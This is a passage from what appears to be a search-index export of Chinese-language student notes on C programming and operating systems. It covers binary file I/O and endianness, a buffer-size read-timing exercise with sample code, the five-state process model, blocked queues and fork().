\u7684\u6587\u4ef6\u4f4d\u7f6e\u6307\u9488\u91cd\u7f6e\u5230\u6587\u4ef6\u7684\u5f00\u5934\u3002\u8fd9\u610f\u5473\u7740\u4efb\u4f55\u540e\u7eed\u7684\u6587\u4ef6\u8bfb\u5199\u64cd\u4f5c\u5c06\u4ece\u6587\u4ef6\u7684\u8d77\u59cb\u4f4d\u7f6e\u5f00\u59cb\u3002</p>"},{"location":"cs/c/4.2/#network","title":"Network","text":"<p>\u5728\u4e0d\u540c\u7684\u786c\u4ef6\u67b6\u6784\u4e0b\u5199\u5165\u548c\u8bfb\u53d6\u51fa\u6765\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u7ed3\u679c\u4e0d\u4e00\u6837\uff0c\u8fd9\u4e2a\u95ee\u9898\u5728\u5f80\u8fd4\u4e0d\u540c\u67b6\u6784\u548c\u8de8\u7f51\u7edc\u7684\u65f6\u5019\u9700\u8981\u88ab\u89e3\u51b3\uff0c\u8be6\u7ec6\u5728\u8ba1\u7b97\u673a\u7f51\u7edc\u8bfe\u7a0b\u4e2d\u7684\u6570\u636e\u7684\u7ec8\u7ed3\u6027</p> <p>32 \u5954\u817e\u5904\u7406\u5668</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define N     10\n\nint array[N];\n\nfor(int n=0 ; n &lt; N ; ++n) {\n    array[n]  =  n;\n}\n\nfwrite(array, N, sizeof int, fp_out);\n</code></pre> <p>32 PowerPC \u8bfb\u53d6</p> <pre><code>#include &lt;stdio.h&gt;\n\n#define N     10\n\nint array[N];\n\nfread(array, N, sizeof int, fp_in);  \n\nfor(int n=0 ; n &lt; N ; ++n) {\n    printf(\"%i \", array[n]);\n}\nprintf(\"\\n\");\n</code></pre>"},{"location":"cs/c/4.3/","title":"4.3 I/O Prac","text":""},{"location":"cs/c/4.3/#workshop","title":"Workshop","text":"<p>\u5728\u8fd9\u4e2a\u7814\u8ba8\u4f1a\u4e2d\uff0c\u4f60\u5c06\u5b66\u4e60\u5982\u4f55\u6d4b\u91cf\u8bfb\u53d6\u6587\u4ef6\u6240\u9700\u7684\u65f6\u95f4\uff0c\u5305\u62ec\u7cfb\u7edf\u8c03\u7528\u7684\u65f6\u95f4\u548c\u4e0d\u540c\u5927\u5c0f\u8f93\u5165\u7f13\u51b2\u533a\u7684\u8bfb\u5199\u65f6\u95f4\u3002\u9996\u5148\uff0c\u4f60\u9700\u8981\u4e00\u4e2a\u5f88\u5927\u7684\u6587\u4ef6\u4ee5\u4fbf\u8fdb\u884c\u6d4b\u8bd5\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u751f\u6210\u4e00\u4e2a\u5927\u7ea61GB\u7684\u6587\u4ef6\uff1a</p> <pre><code>for i in {1..1000} ; do cat /bin/bash &gt;&gt; /tmp/huge ; done\n</code></pre> <p>\u4f60\u7684\u7a0b\u5e8f\u9700\u8981\u63a5\u53d7\u4e24\u4e2a\u547d\u4ee4\u884c\u53c2\u6570\uff1a</p> <ul> <li>\u6587\u4ef6\u8def\u5f84\uff08\u4f8b\u5982 /tmp/huge\uff09</li> </ul> <ul> <li>\u8f93\u5165\u7f13\u51b2\u533a\u7684\u5927\u5c0f\uff08\u4f8b\u5982 1000 \u5b57\u8282\uff09</li> </ul> <pre><code>./readtest /tmp/huge 1000\n</code></pre>"},{"location":"cs/c/4.3/#time-measurement","title":"Time measurement","text":"<ul> <li>\u6253\u5f00\u6587\u4ef6\u7684\u65f6\u95f4</li> </ul> <ul> <li>\u8bfb\u53d6\u6587\u4ef6\u7684\u65f6\u95f4\uff08\u6309\u4e0d\u540c\u7684\u7f13\u51b2\u533a\u5927\u5c0f\uff09</li> </ul>"},{"location":"cs/c/4.3/#sample-solution","title":"Sample solution","text":"<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/time.h&gt;\n\nvoid measure_time(const char* filename, size_t buffer_size) {\n    int fd = open(filename, O_RDONLY);\n    if (fd &lt; 0) {\n        perror(\"open\");\n        exit(EXIT_FAILURE);\n    }\n\n    char *buffer = malloc(buffer_size);\n    if (buffer == NULL) {\n        perror(\"malloc\");\n        exit(EXIT_FAILURE);\n    }\n\n    ssize_t bytes_read;\n    struct timeval start, end;\n\n    // Start time measurement\n    gettimeofday(&amp;start, NULL);\n\n    while ((bytes_read = read(fd, buffer, buffer_size)) &gt; 0) {\n        // Do nothing with the data, just measure read time\n    }\n\n    // End time measurement\n    gettimeofday(&amp;end, NULL);\n\n    close(fd);\n    free(buffer);\n\n    if (bytes_read &lt; 0) {\n        perror(\"read\");\n        exit(EXIT_FAILURE);\n    }\n\n    long seconds = end.tv_sec - start.tv_sec;\n    long microseconds = end.tv_usec - start.tv_usec;\n    double elapsed = seconds + microseconds*1e-6;\n\n    printf(\"Time taken: %.6f seconds\\n\", elapsed);\n}\n\n\nint main(int argc, char *argv[]) {\n    if (argc != 3) {\n        fprintf(stderr, \"Usage: %s &lt;filename&gt; &lt;buffer_size&gt;\\n\", argv[0]);\n        exit(EXIT_FAILURE);\n    }\n\n    const char *filename = argv[1];\n    size_t buffer_size = atoi(argv[2]);\n\n    measure_time(filename, buffer_size);\n\n    return 0;\n}\n</code></pre> <p>\u5b9e\u73b0\u7684\u6838\u5fc3\u5c31\u662f\u7528 gettimeofday \u51fd\u6570\u8ba1\u7b97\u5f53\u5929\u65f6\u95f4\u70b9\uff0c\u76f8\u5173\u4f7f\u7528\u7ec6\u8282\u67e5\u770b section 2.4, \u6700\u540e\u6559\u6388\u7528 google js \u7684\u4e00\u4e2a\u5de5\u5177\u7ed3\u5408 bash \u6587\u4ef6\u751f\u6210\u4e86\u4e00\u4e2a\u6570\u636e\u53ef\u89c6\u5316\u56fe\u8868\uff0c\u6beb\u79d2 vs buffersize, \u4e5f\u53ef\u4ee5\u7528 Excel \u6216\u8005 python matplotlib \u505a</p> <p><code>open plot.html</code> \u4f1a\u76f4\u63a5\u5728\u9ed8\u8ba4\u6d4f\u89c8\u5668\u4e2d\u6253\u5f00\u6587\u4ef6</p> <pre><code>import matplotlib.pyplot as plt\n\nsizes = []\ntimes = []\n\nwith open('results.txt', 'r') as file:\n    for line in file:\n        size, time = line.split()\n        sizes.append(int(size))\n        times.append(float(time))\n\nplt.plot(sizes, times, 'o-')\nplt.xlabel('Buffer Size (bytes)')\nplt.ylabel('Time Taken (seconds)')\nplt.title('Time Taken vs Buffer Size')\nplt.show()\n</code></pre> <p>\u8fd9\u79cd\u7a0b\u5e8f\u5728\u65e5\u540e\u80fd\u591f\u7528\u4e8e\u5206\u6790\u7a0b\u5e8f\u7684\u5185\u5b58\u5360\u7528\u7684\u5de5\u5177\u7684\u8bbe\u8ba1\u601d\u8def</p>"},{"location":"cs/c/4.3/#lab","title":"Lab","text":"<p>\u6ca1\u65f6\u95f4\uff0c\u540e\u7eed\u8865\u4e0a\uff0c\u5148\u770b sample \u9898\u76ee</p>"},{"location":"cs/c/5.1/","title":"5.1 Processes","text":""},{"location":"cs/c/5.1/#mon-lecture","title":"Mon Lecture","text":"<p>\u8fdb\u5ea6\u76ee\u524d\u521a\u521a\u5230 Lecture 8 \u6bd4\u8f83\u8d76\uff0cmidterm \u751a\u81f3\u6db5\u76d6 Lecture 9</p> <p>\u53d8\u91cf\u50a8\u5b58\u5728\u5185\u5b58\u4e2d\uff0c\u5185\u5b58\u4f4d\u7f6e\u53ef\u80fd\u4f1a\u53d1\u751f\u53d8\u5316\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5bf9\u5176\u4f4d\u7f6e\u8fdb\u884c\u8bb0\u5fc6</p> <p>\u4e0a\u4e0b\u6587\u5207\u6362\uff08Context Switch\uff09\u662f\u64cd\u4f5c\u7cfb\u7edf\u5728\u591a\u4efb\u52a1\u73af\u5883\u4e2d\u7ba1\u7406\u591a\u4e2a\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u7684\u5173\u952e\u64cd\u4f5c\u3002\u5b83\u6307\u7684\u662f\u64cd\u4f5c\u7cfb\u7edf\u5728\u4e0d\u540c\u7684\u8fdb\u7a0b\u6216\u7ebf\u7a0b\u4e4b\u95f4\u5207\u6362\u65f6\u6240\u9700\u7684\u8fc7\u7a0b\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u6d89\u53ca\u4fdd\u5b58\u5f53\u524d\u8fdb\u7a0b\u7684\u72b6\u6001\u548c\u52a0\u8f7d\u4e0b\u4e00\u4e2a\u8fdb\u7a0b\u7684\u72b6\u6001\u3002\u4e0a\u4e0b\u6587\u5207\u6362\u662f\u591a\u4efb\u52a1\u64cd\u4f5c\u7cfb\u7edf\u5b9e\u73b0\u5e76\u53d1\u7684\u57fa\u7840\u3002</p>"},{"location":"cs/c/5.1/#states","title":"States","text":"<p>\u8ba1\u7b97\u673a\u53ef\u80fd\u6709\u4e94\u516d\u767e\u4e2a\u8fdb\u7a0b\uff0c\u5c06\u8fd9\u4e9b\u8fdb\u7a0b\u653e\u8fdb arrary \u7ed3\u6784\u7684\u4e0a\u4e0b\u6587\u7ba1\u7406\uff0clink list \u4e0a\u4e0b\u8fde\u63a5\uff0c\u67e5\u770b\u542f\u52a8\u505c\u6b62\uff0c</p> <p>two possible process states that a process may be in at any one time: Running and Ready.</p> <p>\u5206\u9875\u673a\u5236\uff1a</p> <ul> <li>\u5206\u9875\uff08Paging\uff09 \u662f\u4e00\u79cd\u5185\u5b58\u7ba1\u7406\u65b9\u6848\uff0c\u5c06\u8fdb\u7a0b\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\u5212\u5206\u4e3a\u9875\u9762\uff0c\u5c06\u7269\u7406\u5185\u5b58\u5212\u5206\u4e3a\u76f8\u540c\u5927\u5c0f\u7684\u9875\u6846\u3002</li> </ul> <ul> <li>\u5f53\u8fdb\u7a0b\u9700\u8981\u8bbf\u95ee\u5185\u5b58\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5c06\u865a\u62df\u5730\u5740\u8f6c\u6362\u4e3a\u7269\u7406\u5730\u5740\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u6d89\u53ca\u9875\u8868\uff0c\u9875\u8868\u8bb0\u5f55\u4e86\u865a\u62df\u9875\u9762\u4e0e\u7269\u7406\u9875\u6846\u4e4b\u95f4\u7684\u6620\u5c04\u5173\u7cfb\u3002</li> </ul>"},{"location":"cs/c/5.1/#transition","title":"Transition","text":"<p>\u64cd\u4f5c\u7cfb\u7edf\u5177\u6709\u8c03\u5ea6\u5458\u7684\u89d2\u8272 - \u6839\u636e\u67d0\u4e9b\u5b9a\u4e49\u7684\u7b56\u7565\u4e3a\u5904\u7406\u5668\u5206\u6d3e\u5de5\u4f5c \u89e3\u51b3\u516c\u5e73\u6027\u3001\u4f18\u5148\u7ea7\u3001\u660e\u663e\u7684\u201c\u4e92\u52a8\u6027\u201d\u7b49\u95ee\u9898\u3002</p> <p></p> <p>fork parent child</p>"},{"location":"cs/c/5.1/#termination","title":"Termination","text":"<p><code>ulimate -a</code> \u80fd\u591f\u8bbe\u7f6e\u7a0b\u5e8f\u8fd0\u884c\u65f6\u95f4\u548c\u5360\u7528\u5185\u5b58\u7b49\u53c2\u6570</p> <p>\u65f6\u949f\u662f\u5426\u6b63\u5728\u8fd0\u884c\uff0c\u4f1a\u5bf9\u68c0\u67e5</p> <p>\u907f\u514d\u8fdb\u7a0b\u95f2\u7f6e\uff0c\u5728\u8fd0\u884c\u522b\u7684\u8fdb\u7a0b\u7684 IO \u963b\u585e\u7684\u65f6\u5019\u6267\u884c\u7684\u522b\u7684\u4e1c\u897f blocking </p> <p></p> <p>dispatch \u662f\u6d3e\u9063\u7684\u610f\u601d admit \u8ba4\u9886</p> <p>The 5-State Model of Process Execution \u662f\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7528\u4e8e\u7ba1\u7406\u8fdb\u7a0b\u72b6\u6001\u8f6c\u6362\u7684\u7ecf\u5178\u6a21\u578b\u3002\u5b83\u5b9a\u4e49\u4e86\u8fdb\u7a0b\u5728\u6267\u884c\u671f\u95f4\u53ef\u80fd\u5904\u4e8e\u7684\u4e94\u79cd\u72b6\u6001\uff0c\u4ee5\u53ca\u5b83\u4eec\u4e4b\u95f4\u7684\u8f6c\u6362\u5173\u7cfb\u3002\u4ee5\u4e0b\u662f\u8fd9\u4e94\u4e2a\u72b6\u6001\u53ca\u5176\u89e3\u91ca\uff1a</p>"},{"location":"cs/c/5.1/#1-new","title":"1. New\uff08\u65b0\u5efa\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a</li> <li>\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u521a\u88ab\u521b\u5efa\u65f6\uff0c\u5b83\u5904\u4e8e New \u72b6\u6001\u3002\u6b64\u65f6\uff0c\u64cd\u4f5c\u7cfb\u7edf\u5df2\u7ecf\u5206\u914d\u4e86\u5fc5\u8981\u7684\u8d44\u6e90\uff0c\u5e76\u4e3a\u8fdb\u7a0b\u5efa\u7acb\u4e86\u76f8\u5173\u7684\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u8fdb\u7a0b\u8fd8\u6ca1\u6709\u51c6\u5907\u597d\u8fd0\u884c\u3002</li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a</li> <li>\u5f53\u64cd\u4f5c\u7cfb\u7edf\u5b8c\u6210\u5bf9\u65b0\u8fdb\u7a0b\u7684\u521d\u59cb\u5316\u540e\uff0c\u5b83\u4f1a\u8fdb\u5165 Ready \u72b6\u6001\uff0c\u51c6\u5907\u88ab\u8c03\u5ea6\u5668\u8c03\u5ea6\u3002</li> </ul>"},{"location":"cs/c/5.1/#2-ready","title":"2. Ready\uff08\u5c31\u7eea\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a</li> <li>\u5904\u4e8e Ready \u72b6\u6001\u7684\u8fdb\u7a0b\u5df2\u7ecf\u5206\u914d\u4e86\u6240\u9700\u7684\u8d44\u6e90\uff0c\u5e76\u4e14\u51c6\u5907\u597d\u8fd0\u884c\u3002\u5b83\u6b63\u5728\u7b49\u5f85 CPU \u8d44\u6e90\u3002</li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a</li> <li>\u5f53\u8c03\u5ea6\u5668\u51b3\u5b9a\u5c06 CPU \u5206\u914d\u7ed9\u8be5\u8fdb\u7a0b\u65f6\uff0c\u5b83\u4f1a\u4ece Ready \u72b6\u6001\u8f6c\u79fb\u5230 Running \u72b6\u6001\u3002</li> </ul>"},{"location":"cs/c/5.1/#3-running","title":"3. Running\uff08\u8fd0\u884c\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a</li> <li>\u8fdb\u7a0b\u88ab\u5206\u914d\u5230 CPU \u5e76\u6b63\u5728\u6267\u884c\u65f6\uff0c\u5904\u4e8e Running \u72b6\u6001\u3002\u6b64\u65f6\uff0c\u8fdb\u7a0b\u5b9e\u9645\u5360\u7528 CPU \u5e76\u6267\u884c\u6307\u4ee4\u3002</li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a</li> <li>\u8fdb\u7a0b\u53ef\u80fd\u4ece Running \u72b6\u6001\u8f6c\u79fb\u5230\u4ee5\u4e0b\u51e0\u79cd\u72b6\u6001\uff1a<ul> <li>Blocked\uff1a\u5982\u679c\u8fdb\u7a0b\u9700\u8981\u7b49\u5f85\u67d0\u79cd\u8d44\u6e90\uff08\u5982 I/O \u64cd\u4f5c\uff09\uff0c\u5b83\u4f1a\u8fdb\u5165 Blocked \u72b6\u6001\u3002</li> <li>Ready\uff1a\u5982\u679c\u8fdb\u7a0b\u65f6\u95f4\u7247\u7528\u5b8c\uff0c\u4f46\u8fd8\u6ca1\u6709\u5b8c\u6210\uff0c\u5b83\u4f1a\u56de\u5230 Ready \u72b6\u6001\uff0c\u7b49\u5f85\u4e0b\u4e00\u6b21\u8c03\u5ea6\u3002</li> <li>Terminated\uff1a\u5982\u679c\u8fdb\u7a0b\u6267\u884c\u5b8c\u6210\u6216\u88ab\u5f3a\u5236\u7ec8\u6b62\uff0c\u5b83\u4f1a\u8fdb\u5165 Terminated \u72b6\u6001\u3002</li> </ul> </li> </ul>"},{"location":"cs/c/5.1/#4-blocked","title":"4. Blocked\uff08\u963b\u585e\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a</li> <li>\u5f53\u8fdb\u7a0b\u7b49\u5f85\u67d0\u4e2a\u4e8b\u4ef6\uff08\u5982 I/O \u5b8c\u6210\u3001\u83b7\u53d6\u8d44\u6e90\u7b49\uff09\u65f6\uff0c\u5b83\u8fdb\u5165 Blocked \u72b6\u6001\u3002\u5728\u8fd9\u4e2a\u72b6\u6001\u4e0b\uff0c\u8fdb\u7a0b\u4e0d\u80fd\u8fd0\u884c\uff0c\u751a\u81f3\u4e0d\u80fd\u88ab\u8c03\u5ea6\uff0c\u76f4\u5230\u4e8b\u4ef6\u53d1\u751f\u3002</li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a</li> <li>\u4e00\u65e6\u7b49\u5f85\u7684\u4e8b\u4ef6\u53d1\u751f\uff0c\u8fdb\u7a0b\u4f1a\u4ece Blocked \u72b6\u6001\u8f6c\u79fb\u5230 Ready \u72b6\u6001\uff0c\u7b49\u5f85 CPU \u5206\u914d\u3002</li> </ul>"},{"location":"cs/c/5.1/#5-terminated","title":"5. Terminated\uff08\u7ec8\u6b62\uff09","text":"<ul> <li>\u63cf\u8ff0\uff1a</li> <li>\u5f53\u8fdb\u7a0b\u5b8c\u6210\u6267\u884c\u6216\u88ab\u64cd\u4f5c\u7cfb\u7edf\u7ec8\u6b62\u65f6\uff0c\u5b83\u8fdb\u5165 Terminated \u72b6\u6001\u3002\u6b64\u65f6\u8fdb\u7a0b\u7684\u6267\u884c\u7ed3\u675f\uff0c\u6240\u6709\u7684\u8d44\u6e90\u90fd\u5c06\u88ab\u91ca\u653e\u3002</li> <li>\u8f6c\u6362\u6761\u4ef6\uff1a</li> <li>\u5728\u8fdb\u7a0b\u7ec8\u6b62\u4e4b\u540e\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u6e05\u7406\u8fdb\u7a0b\u6240\u4f7f\u7528\u7684\u8d44\u6e90\uff0c\u5305\u62ec\u5185\u5b58\u3001\u6587\u4ef6\u63cf\u8ff0\u7b26\u7b49\u3002</li> </ul>"},{"location":"cs/c/5.1/#_1","title":"\u72b6\u6001\u8f6c\u6362\u56fe","text":"<p>\u4ee5\u4e0b\u662f\u8fdb\u7a0b\u5728\u4e0d\u540c\u72b6\u6001\u4e4b\u95f4\u8f6c\u6362\u7684\u4e3b\u8981\u65b9\u5f0f\uff1a</p> <ul> <li>New \u2192 Ready\uff1a\u8fdb\u7a0b\u521d\u59cb\u5316\u5b8c\u6210\uff0c\u51c6\u5907\u6267\u884c\u3002</li> <li>Ready \u2192 Running\uff1a\u8c03\u5ea6\u5668\u9009\u62e9\u8fdb\u7a0b\u5e76\u5206\u914d CPU\u3002</li> <li>Running \u2192 Blocked\uff1a\u8fdb\u7a0b\u7b49\u5f85\u67d0\u4e2a\u4e8b\u4ef6\uff08\u5982 I/O \u64cd\u4f5c\uff09\u3002</li> <li>Blocked \u2192 Ready\uff1a\u4e8b\u4ef6\u53d1\u751f\uff08\u5982 I/O \u5b8c\u6210\uff09\uff0c\u8fdb\u7a0b\u51c6\u5907\u518d\u6b21\u6267\u884c\u3002</li> <li>Running \u2192 Ready\uff1a\u65f6\u95f4\u7247\u7528\u5b8c\uff0c\u8fdb\u7a0b\u7b49\u5f85\u4e0b\u4e00\u6b21\u8c03\u5ea6\u3002</li> <li>Running \u2192 Terminated\uff1a\u8fdb\u7a0b\u6267\u884c\u5b8c\u6210\u6216\u88ab\u7ec8\u6b62\u3002</li> </ul> <p>The 5-State Model \u63cf\u8ff0\u4e86\u8fdb\u7a0b\u4ece\u521b\u5efa\u5230\u7ec8\u6b62\u7684\u6574\u4e2a\u751f\u547d\u5468\u671f\u4e2d\u53ef\u80fd\u7ecf\u5386\u7684\u4e94\u79cd\u72b6\u6001\u3002\u8fd9\u4e94\u79cd\u72b6\u6001\u4f7f\u64cd\u4f5c\u7cfb\u7edf\u80fd\u591f\u6709\u6548\u5730\u8c03\u5ea6\u548c\u7ba1\u7406\u591a\u4e2a\u8fdb\u7a0b\uff0c\u786e\u4fdd\u8d44\u6e90\u7684\u5408\u7406\u5229\u7528\u548c\u8fdb\u7a0b\u7684\u5e76\u53d1\u6267\u884c\u3002</p>"},{"location":"cs/c/5.2/","title":"5.2 Multiple Blocked States","text":""},{"location":"cs/c/5.2/#wed-lecture","title":"Wed Lecture","text":"<p>\u591a\u963b\u585e\u961f\u5217\u6a21\u578b\uff0c\u907f\u514d\u4e00\u4e2a\u4efb\u52a1\u5728 CPU \u6216 I/O \u7b49\u963b\u585e\u540e\u62d6\u6162\u8fdb\u5ea6</p> <p>\u8be5\u56fe\u5c55\u793a\u4e86\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u7684 Multiple Blocked Queues\uff08\u591a\u963b\u585e\u961f\u5217\uff09 \u6a21\u578b\u3002\u5728\u8fd9\u4e2a\u6a21\u578b\u4e2d\uff0c\u8fdb\u7a0b\u53ef\u4ee5\u56e0\u4e0d\u540c\u4e8b\u4ef6\u800c\u8fdb\u5165\u963b\u585e\u72b6\u6001\uff0c\u5e76\u4e14\u6bcf\u4e2a\u963b\u585e\u72b6\u6001\u5bf9\u5e94\u4e00\u4e2a\u4e8b\u4ef6\u961f\u5217\u3002\u8fd9\u6709\u52a9\u4e8e\u64cd\u4f5c\u7cfb\u7edf\u66f4\u9ad8\u6548\u5730\u7ba1\u7406\u8fdb\u7a0b\u7684\u8c03\u5ea6\u3002</p>"},{"location":"cs/c/5.2/#_1","title":"\u56fe\u4e2d\u5173\u952e\u90e8\u5206\u7684\u89e3\u91ca\uff1a","text":"<ol> <li> <p>Ready Queue\uff08\u5c31\u7eea\u961f\u5217\uff09\uff1a    - \u6240\u6709\u51c6\u5907\u597d\u6267\u884c\u7684\u8fdb\u7a0b\u90fd\u88ab\u653e\u5728 Ready Queue \u4e2d\uff0c\u7b49\u5f85\u8c03\u5ea6\u5668\u5206\u914d CPU\u3002\u5f53\u64cd\u4f5c\u7cfb\u7edf\u5c06 CPU \u8d44\u6e90\u5206\u914d\u7ed9\u4e00\u4e2a\u8fdb\u7a0b\u65f6\uff0c\u8fdb\u7a0b\u4ece Ready Queue \u4e2d\u8c03\u5ea6\uff08Dispatch\uff09\u5e76\u5f00\u59cb\u5728\u5904\u7406\u5668\u4e0a\u8fd0\u884c\u3002</p> </li> <li> <p>Processor\uff08\u5904\u7406\u5668\uff09\uff1a    - \u5904\u7406\u5668\u6267\u884c\u4ece\u5c31\u7eea\u961f\u5217\u4e2d\u8c03\u5ea6\u7684\u8fdb\u7a0b\u3002\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u6b63\u5728\u8fd0\u884c\u65f6\uff0c\u5b83\u4f1a\u4f7f\u7528 CPU \u8fdb\u884c\u8ba1\u7b97\u548c\u6267\u884c\u6307\u4ee4\u3002</p> </li> <li> <p>Timeout\uff08\u8d85\u65f6\uff09\uff1a    - \u5982\u679c\u5206\u914d\u7ed9\u8fdb\u7a0b\u7684\u65f6\u95f4\u7247\uff08CPU \u65f6\u95f4\uff09\u7528\u5b8c\u4e86\uff0c\u8fdb\u7a0b\u5c06\u8fd4\u56de Ready Queue\uff0c\u7b49\u5f85\u4e0b\u4e00\u4e2a\u8c03\u5ea6\u5468\u671f\u3002</p> </li> <li> <p>Event n Wait\uff08\u7b49\u5f85\u4e8b\u4ef6 n\uff09\uff1a    - \u5982\u679c\u8fd0\u884c\u4e2d\u7684\u8fdb\u7a0b\u9700\u8981\u7b49\u5f85\u67d0\u4e2a\u5916\u90e8\u4e8b\u4ef6\uff08\u5982 I/O \u64cd\u4f5c\u5b8c\u6210\uff09\uff0c\u5b83\u5c06\u4ece\u5904\u7406\u5668\u4e2d\u88ab\u79fb\u9664\uff0c\u5e76\u8fdb\u5165\u76f8\u5e94\u7684 Event Queue\uff08\u4e8b\u4ef6\u961f\u5217\uff09\u4e2d\uff0c\u8fdb\u5165 Blocked \u72b6\u6001\u3002\u8fd9\u4e2a\u6a21\u578b\u4f7f\u7528\u591a\u4e2a\u963b\u585e\u961f\u5217\uff0c\u4ee3\u8868\u8fdb\u7a0b\u53ef\u4ee5\u56e0\u4e0d\u540c\u7684\u4e8b\u4ef6\uff08\u5982\u591a\u4e2a I/O \u64cd\u4f5c\uff09\u8fdb\u5165\u4e0d\u540c\u7684\u963b\u585e\u961f\u5217\u3002</p> </li> <li> <p>Event n Queue\uff08\u4e8b\u4ef6 n \u963b\u585e\u961f\u5217\uff09\uff1a    - \u5bf9\u4e8e\u6bcf\u4e2a\u9700\u8981\u7b49\u5f85\u7684\u4e8b\u4ef6\uff08\u5982 I/O \u5b8c\u6210\u3001\u4fe1\u53f7\u7b49\uff09\uff0c\u90fd\u6709\u4e00\u4e2a\u5355\u72ec\u7684\u961f\u5217\u3002\u88ab\u963b\u585e\u7684\u8fdb\u7a0b\u8fdb\u5165\u76f8\u5e94\u7684\u4e8b\u4ef6\u961f\u5217\uff0c\u7b49\u5f85\u4e8b\u4ef6\u53d1\u751f\u3002</p> </li> <li> <p>Event n Occurs\uff08\u4e8b\u4ef6 n \u53d1\u751f\uff09\uff1a    - \u5f53\u67d0\u4e2a\u4e8b\u4ef6\u53d1\u751f\u65f6\uff08\u4f8b\u5982 I/O \u64cd\u4f5c\u5b8c\u6210\uff09\uff0c\u76f8\u5e94\u7684\u4e8b\u4ef6\u961f\u5217\u4e2d\u7684\u8fdb\u7a0b\u4f1a\u88ab\u79fb\u51fa\u5e76\u653e\u56de Ready Queue\uff0c\u51c6\u5907\u518d\u6b21\u88ab\u8c03\u5ea6\u6267\u884c\u3002</p> </li> <li> <p>Release\uff08\u91ca\u653e\uff09\uff1a    - \u5f53\u8fdb\u7a0b\u5b8c\u6210\u6240\u6709\u4efb\u52a1\u65f6\uff0c\u5b83\u4f1a\u4ece\u5904\u7406\u5668\u4e2d\u88ab\u91ca\u653e\uff0c\u64cd\u4f5c\u7cfb\u7edf\u7ed3\u675f\u8be5\u8fdb\u7a0b\u7684\u6267\u884c\u3002</p> </li> </ol> <p>Multiple Blocked Queues \u6a21\u578b\u5141\u8bb8\u64cd\u4f5c\u7cfb\u7edf\u6839\u636e\u4e0d\u540c\u4e8b\u4ef6\u5c06\u8fdb\u7a0b\u653e\u5165\u4e0d\u540c\u7684\u963b\u585e\u961f\u5217\uff0c\u7b49\u5f85\u76f8\u5e94\u4e8b\u4ef6\u7684\u5b8c\u6210\u3002\u8fd9\u6837\u53ef\u4ee5\u66f4\u6709\u6548\u5730\u7ba1\u7406\u591a\u4e2a\u8fdb\u7a0b\uff0c\u5e76\u63d0\u9ad8\u7cfb\u7edf\u7684\u5e76\u53d1\u5904\u7406\u80fd\u529b\u3002</p> <p>\u963b\u585e\u8fdb\u7a0b\u542f\u7528\u865a\u62df\u5185\u5b58\u8c03\u7528\u5b58\u5165 disk \u4e2d\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u63d0\u4f9b\u66f4\u591a\u5185\u5b58\u652f\u6301\u5176\u4ed6\u4efb\u52a1\uff0c\u5f53\u6ca1\u6709\u5176\u4ed6\u4efb\u52a1\u7684\u65f6\u5019\u4ece\u4e2d\u53d6\u51fa\u518d\u7ee7\u7eed\u6267\u884c\uff0c\u53d6\u51fa\u4e4b\u524d\u79f0\u4e4b\u4e3a Suspend \u72b6\u6001</p> <p>\u7cfb\u7edf\u8c03\u7528 fork system call:</p> <p>\u5b50\u8fdb\u7a0b\u662f\u7236\u8fdb\u7a0b\u7684\u5b8c\u5168 copy \u5386\u53f2\u4e2d\u53eb\u514b\u9686\u8fc7\u7a0b fork </p>"},{"location":"cs/c/5.2/#creating-a-new-process-using-fork","title":"Creating a new process using fork()","text":"<pre><code>#include  &lt;stdio.h&gt;\n#include  &lt;unistd.h&gt;\n\nvoid function(void)\n{\n    int  pid;                 // some systems define a pid_t\n\n    switch (pid = fork()) {\n    case -1 :\n        printf(\"fork() failed\\n\");     // process creation failed\n        exit(EXIT_FAILURE);\n        break;\n\n    case 0:                   // new child process\n        printf(\"c:  value of pid=%i\\n\", pid);\n        printf(\"c:  child's pid=%i\\n\", getpid());\n        printf(\"c:  child's parent pid=%i\\n\", getppid());\n        break;\n\n    default:                  // original parent process\n        sleep(1);\n        printf(\"p:  value of pid=%i\\n\", pid);\n        printf(\"p:  parent's pid=%i\\n\", getpid());\n        printf(\"p:  parent's parent pid=%i\\n\", getppid());\n        break;\n    }\n    fflush(stdout);\n}\n</code></pre> <p>fork() \u662f UNIX \u7cfb\u7edf\u4e2d\u7684\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u7528\u4e8e\u521b\u5efa\u4e00\u4e2a\u65b0\u8fdb\u7a0b\u3002\u5b83\u4f1a\u590d\u5236\u5f53\u524d\u8fdb\u7a0b\uff08\u79f0\u4e3a\u201c\u7236\u8fdb\u7a0b\u201d\uff09\uff0c\u5e76\u751f\u6210\u4e00\u4e2a\u51e0\u4e4e\u5b8c\u5168\u76f8\u540c\u7684\u65b0\u8fdb\u7a0b\uff08\u79f0\u4e3a\u201c\u5b50\u8fdb\u7a0b\u201d\uff09\u3002\u65b0\u8fdb\u7a0b\u7684\u4ee3\u7801\u548c\u6570\u636e\u6bb5\u4e0e\u7236\u8fdb\u7a0b\u4e00\u81f4\uff0c\u4f46\u5b83\u4eec\u662f\u72ec\u7acb\u8fd0\u884c\u7684\u3002</p> <p>fork() 